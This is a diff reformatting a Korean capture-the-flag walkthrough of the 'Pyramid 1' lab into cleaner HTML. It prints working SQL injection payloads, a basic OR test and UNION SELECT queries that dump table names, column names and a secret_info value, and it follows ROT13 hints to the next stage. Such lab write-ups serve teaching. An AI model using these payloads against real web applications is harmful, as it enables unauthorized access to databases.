@@ -1,250 +1,190 @@
-<html>
-
-<head>
-<meta http-equiv=Content-Type content="text/html; charset=utf-8">
-<meta name=Generator content="Microsoft Word 15 (filtered)">
-<link rel="stylesheet" href="index.css">
-</head>
-
-<body lang=EN-US link="#0563C1" vlink="#954F72" style='word-wrap:break-word'>
-
-<div class=WordSection1>
-
-<p class=MsoNormal align=center style='text-align:center'><b><span
-style='font-size:16.0pt;line-height:107%'>Pyramid 1<span lang=KO>단계 </span>SQLi
-Walkthrough</span></b></p>
-
-<p class=MsoNormal align=center style='text-align:center'><span
-style='font-size:11.0pt;line-height:107%'>&nbsp;</span></p>
-
-<p class=MsoNormal align=center style='text-align:center'><span
-style='font-size:11.0pt;line-height:107%'>&nbsp;</span></p>
-
-<p class=MsoNormal align=left style='text-align:left'><span style='font-size:
-11.0pt;line-height:107%'>IP <span lang=KO>확인 후 </span>http <span lang=KO>접속</span></span></p>
-
-<p class=MsoNormal><img width=643 height=549 id="그림 2"
-src="1.이재민_ctf_문제풀이_files/image001.jpg"></p>
-
-<p class=MsoNormal align=center style='text-align:center'><span
-style='font-size:11.0pt;line-height:107%'>&nbsp;</span></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal align=center style='text-align:center'>&nbsp;</p>
-
-<p class=MsoNormal align=left style='text-align:left'><span class=hljs-string><span
-style='font-size:16.0pt;line-height:107%;font-family:Consolas;color:#6A8759'>'
-OR '</span></span><span class=hljs-number><span style='font-size:16.0pt;
-line-height:107%;font-family:Consolas;color:#6896BA'>1</span></span><span
-class=hljs-string><span style='font-size:16.0pt;line-height:107%;font-family:
-Consolas;color:#6A8759'>'='</span></span><span class=hljs-number><span
-style='font-size:16.0pt;line-height:107%;font-family:Consolas;color:#6896BA'>1</span></span></p>
-
-<p class=MsoNormal align=left style='text-align:left'><span lang=KO
-style='font-size:11.0pt;line-height:107%'>가장 기본적인</span><span style='font-size:
-11.0pt;line-height:107%'> SQLi <span lang=KO>입력해보기 </span>(<span lang=KO>모든 행을 반환</span>)</span></p>
-
-<p class=MsoNormal align=center style='text-align:center'><img width=652
-height=552 id="그림 1" src="1.이재민_ctf_문제풀이_files/image002.jpg"></p>
-
-<p class=MsoNormal align=left style='margin-top:15.0pt;margin-right:0in;
-margin-bottom:0in;margin-left:0in;text-align:left;line-height:normal;
-text-autospace:ideograph-numeric ideograph-other;word-break:normal'><span
-style='font-size:13.5pt;font-family:"Courier New"'>&nbsp;</span></p>
-
-<p class=MsoNormal align=left style='margin-top:15.0pt;margin-right:0in;
-margin-bottom:0in;margin-left:0in;text-align:left;line-height:normal;
-text-autospace:ideograph-numeric ideograph-other;word-break:normal'><span
-lang=KO style='font-size:13.5pt'>알 수 있는 사실</span></p>
-
-<p class=MsoNormal align=left style='margin-top:15.0pt;margin-right:0in;
-margin-bottom:0in;margin-left:0in;text-align:left;line-height:normal;
-text-autospace:ideograph-numeric ideograph-other;word-break:normal'>&nbsp;</p>
-
-<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><span
-style='font-size:11.0pt;line-height:107%'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
-</span></span><span lang=KO style='font-size:11.0pt;line-height:107%'>입력값이 필터링 없이</span><span
-style='font-size:11.0pt;line-height:107%'> DB <span lang=KO>쿼리에 직접 사용되고 있다</span>.</span></p>
-
-<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><span
-style='font-size:11.0pt;line-height:107%'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
-</span></span><span style='font-size:11.0pt;line-height:107%'>URL<span lang=KO>에서
-파라미터</span> name <span lang=KO>노출되며 </span>GET <span lang=KO>방식으로 서버 전송되고있다</span>.</span></p>
-
-<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><span
-style='font-size:11.0pt;line-height:107%'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
-</span></span><span style='font-size:11.0pt;line-height:107%'>php<span lang=KO>는
-총 </span>3<span lang=KO>개의 칼럼만 표시하고 있다</span>.</span></p>
-
-<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><span
-style='font-size:11.0pt;line-height:107%'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
-</span></span><span style='font-size:11.0pt;line-height:107%'>OR<span lang=KO>이
-작동하는 것으로 보아 </span>SELECT, OR <span lang=KO>등이</span> php<span lang=KO>에서 필터링 되지
-않고 있다</span>. (sql<span lang=KO>취약점존재</span>)</span></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoListParagraph align=left style='margin-left:38.0pt;text-align:left;
-text-indent:-.25in'><b><span style='font-size:12.0pt;line-height:107%'>1.<span
-style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp; </span></span></b><b><span
-lang=KO style='font-size:12.0pt;line-height:107%'>테이블명 추출하는 </span></b><b><span
-style='font-size:12.0pt;line-height:107%'>SQLi <span lang=KO>실행</span></span></b></p>
-
-<p class=MsoNormal align=left style='text-align:left'><span style='font-size:
-16.0pt;line-height:107%;font-family:Consolas;color:#6A8759;background:#2B2B2B'>'
-UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables
-WHERE table_schema=database() --</span></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><img width=664 height=519 id="그림 3"
-src="1.이재민_ctf_문제풀이_files/image003.jpg"></p>
-
-<p class=MsoNormal align=center style='text-align:center'><span
-style='font-size:11.0pt;line-height:107%'>2<span lang=KO>번째 항목에 테이블이름 출력</span></span></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><b><span
-style='font-size:12.0pt;line-height:107%'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;
-</span></span></b><b><span lang=KO style='font-size:12.0pt;line-height:107%'>칼럼명을
-추출하는 </span></b><b><span style='font-size:12.0pt;line-height:107%'>SQLi <span
-lang=KO>실행</span></span></b></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><span class=hljs-string><span style='font-size:14.0pt;
-line-height:107%;font-family:Consolas;color:#6A8759'>' UNION SELECT 1,
-group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='</span></span><span
-style='font-size:14.0pt;line-height:107%;font-family:Consolas;color:#BABABA;
-background:#2B2B2B'>pharaohs</span><span class=hljs-string><span
-style='font-size:14.0pt;line-height:107%;font-family:Consolas;color:#6A8759'>'
---</span></span></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><img width=661 height=473 id="그림 4"
-src="1.이재민_ctf_문제풀이_files/image004.jpg"></p>
-
-<p class=MsoNormal align=center style='text-align:center'>2<span lang=KO>번째 항목에
-모든 칼럼명 출력</span></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><b><span
-style='font-size:12.0pt;line-height:107%'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;
-</span></span></b><b><span style='font-size:12.0pt;line-height:107%'>secret_info<span
-lang=KO>에 담긴 최종힌트를 얻는 </span>SQLi <span lang=KO>실행</span></span></b></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%;font-family:
-Consolas;color:#6A8759;background:#2B2B2B'>' UNION SELECT 1, 2, secret_info
-FROM pharaohs WHERE id = 6 --</span></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><img width=601 height=410 id="그림 5"
-src="1.이재민_ctf_문제풀이_files/image005.jpg"></p>
-
-<p class=MsoNormal align=center style='text-align:center'><span lang=KO>최종 힌트 획득</span></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><img width=602 height=98 id="그림 6"
-src="1.이재민_ctf_문제풀이_files/image006.jpg"></p>
-
-<p class=MsoNormal align=center style='text-align:center'><span lang=KO>웹 페이지 소스에
-담긴 주석 힌트</span> : <span lang=KO>엄청 긴 문자열</span></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><img width=602 height=415 id="그림 7"
-src="1.이재민_ctf_문제풀이_files/image007.jpg"></p>
-
-<p class=MsoNormal align=center style='text-align:center'><span
-style='color:black;background:#FCFCFC'>ROT13.com <span lang=KO>에서 디코딩</span></span></p>
-
-<p class=MsoNormal align=left style='text-align:left'><span style='background:
-#FCFCFC'>&nbsp;</span></p>
-
-<p class=MsoNormal align=left style='text-align:left'><span style='color:black;
-background:#FCFCFC'>&quot;<span lang=KO>파라오의 암호는 문지기의 열쇠를 위한 것이 아니라</span>, <span
-lang=KO>펼쳐지는 나일강 지도의 논리를 위해 존재한다</span>. <span lang=KO>흐름을 따라 다음 방으로 나아가라</span>.&quot;</span></p>
-
-<p class=MsoNormal align=left style='text-align:left'><span lang=KO
-style='color:#222222'>이 문구는</span><span style='color:#222222'> SSH <span
-lang=KO>접속 정보가 아님을 간접적으로 나타내며</span>, <span lang=KO>다음 웹 디렉토리를 이동해야 함을 비유적으로 알 수
-있다</span>.</span></p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><img width=577 height=62 id="그림 8"
-src="1.이재민_ctf_문제풀이_files/image008.png"></p>
-
-<p class=MsoNormal><span lang=KO>최종 힌트를 보면</span> '/' <span lang=KO>표시가 있는데</span>,
-<span lang=KO>이것을 보고</span>&nbsp;<b><span lang=KO>디렉토리 경로</span></b><span
-lang=KO>라는 것을 유추해볼 수 있다</span>.</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><span lang=KO>얻은 정보들을 바탕으로</span>
-&quot;http://pyramidIP/the_architect_of_the_Great_Pyramid&quot; <span lang=KO>로
-이동하면 다음 단계로 넘어간다</span>.</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><img width=601 height=379 id="그림 9"
-src="1.이재민_ctf_문제풀이_files/image009.jpg"></p>
-
-<p class=MsoNormal>trivia <span lang=KO>칼럼의 값들을 조회해보니 어떤 문구와 함께 </span>3000<span
-lang=KO>자 분량의 반복되는 문자열이 나타난다</span>.</p>
-
-<p class=MsoNormal><span lang=KO>해석해본 결과 </span>sqlmap <span lang=KO>자동화 기법이 아닌
-수동 </span>SQLi<span lang=KO>를 유도하는것을 알 수 있다</span>.</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal>&nbsp;</p>
-
-<p class=MsoNormal><span lang=KO style='line-height:107%'>조금</span><span
-lang=KO style='line-height:107%;font-family:"Arial",sans-serif'> </span><span
-lang=KO style='line-height:107%'>더</span><span lang=KO style='line-height:107%;
-font-family:"Arial",sans-serif'> </span><span lang=KO style='line-height:107%'>자세한</span><span
-lang=KO style='line-height:107%;font-family:"Arial",sans-serif'> </span><span
-lang=KO style='line-height:107%'>풀이</span><span style='line-height:107%;
-font-family:"Arial",sans-serif'> : </span><a
-href="https://mini97.tistory.com/97"><span style='line-height:107%;font-family:
-"Arial",sans-serif'>https://mini97.tistory.com/97</span></a><span
-style='line-height:107%;font-family:"Arial",sans-serif'>  </span><span lang=KO
-style='line-height:107%'>비밀번호</span><span style='line-height:107%;font-family:
-"Arial",sans-serif'>:cmd</span></p>
-
-</div>
-
-</body>
-
+<!DOCTYPE html>
+<html lang="ko">
+  <head>
+    <meta charset="utf-8" />
+    <title>Pyramid 1 – SQLi Walkthrough</title>
+    <link rel="stylesheet" href="index.css" />
+  </head>
+
+  <body>
+    <main class="ctf-page">
+      <header class="ctf-header">
+        <h1 class="heading-main">Pyramid 1 단계 SQLi Walkthrough</h1>
+      </header>
+
+      <section class="ctf-section">
+        <p class="para">IP 확인 후 HTTP로 서비스에 접속한다.</p>
+
+        <figure class="fig">
+          <img
+            src="1.이재민_ctf_문제풀이_files/image001.jpg"
+            alt="Pyramid 1 초기 접속 화면"
+          />
+          <figcaption class="fig-caption">초기 진입 페이지 화면</figcaption>
+        </figure>
+
+        <p class="para">
+          검색 입력창에 <code class="code-inline">' OR '1'='1</code> 과 같은
+          가장 기본적인 SQLi 페이로드를 입력했을 때 전체 행이 반환되는지 확인한다.
+        </p>
+
+        <figure class="fig">
+          <img
+            src="1.이재민_ctf_문제풀이_files/image002.jpg"
+            alt="기본 SQLi 페이로드 실행 결과"
+          />
+          <figcaption class="fig-caption">
+            기본 SQLi 페이로드 입력 후 전체 레코드가 조회되는 모습
+          </figcaption>
+        </figure>
+
+        <h2 class="heading-sub">알 수 있는 사실</h2>
+        <ul class="bullet-list">
+          <li>입력값이 필터링 없이 DB 쿼리에 직접 사용된다.</li>
+          <li>URL 에서 파라미터 name 값이 그대로 노출되며 GET 방식으로 서버로 전송된다.</li>
+          <li>화면에는 3개의 칼럼만 표시되지만 실제 쿼리에는 더 많은 컬럼이 존재할 수 있다.</li>
+          <li>OR, SELECT 등 키워드가 차단되지 않아 SQL Injection 취약점이 존재한다.</li>
+        </ul>
+      </section>
+
+      <section class="ctf-section">
+        <h2 class="heading-sub">1. 테이블명 추출 SQLi</h2>
+        <p class="para">
+          UNION 기반 SQL Injection을 이용해 현재 데이터베이스의 테이블 이름을 수집한다.
+        </p>
+
+        <pre class="code-block">
+' UNION SELECT 1, group_concat(table_name), 3
+  FROM information_schema.tables
+ WHERE table_schema = database() --</pre>
+
+        <figure class="fig">
+          <img
+            src="1.이재민_ctf_문제풀이_files/image003.jpg"
+            alt="테이블명 추출 결과"
+          />
+          <figcaption class="fig-caption">
+            두 번째 컬럼 위치에 테이블 이름들이 출력된다.
+          </figcaption>
+        </figure>
+      </section>
+
+      <section class="ctf-section">
+        <h2 class="heading-sub">2. 칼럼명 추출 SQLi</h2>
+        <p class="para">
+          식별한 테이블 <code class="code-inline">pharaohs</code> 에 대해 모든 컬럼명을
+          조회한다.
+        </p>
+
+        <pre class="code-block">
+' UNION SELECT 1, group_concat(column_name), 3
+  FROM information_schema.columns
+ WHERE table_name = 'pharaohs' --</pre>
+
+        <figure class="fig">
+          <img
+            src="1.이재민_ctf_문제풀이_files/image004.jpg"
+            alt="pharaohs 테이블 컬럼명 추출 결과"
+          />
+          <figcaption class="fig-caption">
+            두 번째 컬럼 위치에 pharaohs 테이블의 모든 컬럼명이 출력된다.
+          </figcaption>
+        </figure>
+      </section>
+
+      <section class="ctf-section">
+        <h2 class="heading-sub">3. secret_info 컬럼에서 최종 힌트 획득</h2>
+        <p class="para">
+          <code class="code-inline">pharaohs</code> 테이블의
+          <code class="code-inline">secret_info</code> 컬럼을 대상으로 조건부 조회를 수행해
+          최종 힌트를 얻는다.
+        </p>
+
+        <pre class="code-block">
+' UNION SELECT 1, 2, secret_info
+  FROM pharaohs
+ WHERE id = 6 --</pre>
+
+        <figure class="fig">
+          <img
+            src="1.이재민_ctf_문제풀이_files/image005.jpg"
+            alt="secret_info 컬럼 조회 결과"
+          />
+          <figcaption class="fig-caption">
+            secret_info 컬럼에서 의미 있는 문장이 조회된다.
+          </figcaption>
+        </figure>
+      </section>
+
+      <section class="ctf-section">
+        <h2 class="heading-sub">4. 소스코드 주석과 ROT13 힌트 해석</h2>
+
+        <figure class="fig">
+          <img
+            src="1.이재민_ctf_문제풀이_files/image006.jpg"
+            alt="소스 코드 주석에 포함된 긴 문자열"
+          />
+          <figcaption class="fig-caption">
+            페이지 소스 주석에 매우 긴 문자열이 포함되어 있다.
+          </figcaption>
+        </figure>
+
+        <figure class="fig">
+          <img
+            src="1.이재민_ctf_문제풀이_files/image007.jpg"
+            alt="ROT13.com 에서 문자열 디코딩"
+          />
+          <figcaption class="fig-caption">
+            ROT13.com 등 온라인 도구를 이용해 문자열을 디코딩한다.
+          </figcaption>
+        </figure>
+
+        <p class="para">
+          ROT13 디코딩 결과는 “파라오의 암호는 문지기의 열쇠를 위한 것이 아니라, 펼쳐지는 나일강
+          지도의 논리를 위해 존재한다. 흐름을 따라 다음 방으로 나아가라.” 와 같은 의미의 문장이다.
+        </p>
+        <p class="para">
+          이 문구는 SSH 접속 정보가 아니라는 점을 암시하며, 흐름(flow)을 따라 웹 디렉터리를
+          이동해야 한다는 메시지를 비유적으로 전달한다.
+        </p>
+
+        <figure class="fig">
+          <img
+            src="1.이재민_ctf_문제풀이_files/image008.png"
+            alt="디렉터리 경로를 암시하는 힌트"
+          />
+          <figcaption class="fig-caption">
+            슬래시(/)와 함께 디렉터리 경로 형태의 문자열이 포함되어 있다.
+          </figcaption>
+        </figure>
+
+        <p class="para">
+          최종 힌트에 슬래시(<code class="code-inline">/</code>)가 포함되어 있어 디렉터리
+          경로임을 유추할 수 있고,
+          <code class="code-inline">http://pyramidIP/the_architect_of_the_Great_Pyramid</code>
+          와 같은 URL 로 이동하면 다음 단계로 넘어갈 수 있다.
+        </p>
+
+        <figure class="fig">
+          <img
+            src="1.이재민_ctf_문제풀이_files/image009.jpg"
+            alt="trivia 칼럼 조회 결과"
+          />
+          <figcaption class="fig-caption">
+            trivia 칼럼에는 3000자 분량의 반복 문자열과 수동 SQLi 를 유도하는 메시지가 포함된다.
+          </figcaption>
+        </figure>
+
+        <p class="para">
+          trivia 칼럼의 내용을 읽어 보면 자동화 도구(sqlmap) 대신 수동 SQL Injection 과정을
+          경험해 보라는 의도가 담겨 있음을 알 수 있다.
+        </p>
+
+        <p class="para">
+          더 자세한 풀이 과정은 외부 블로그에 정리되어 있으며,
+          비밀번호는 <code class="code-inline">cmd</code> 로 안내된다.
+        </p>
+      </section>
+    </main>
+  </body>
 </html>
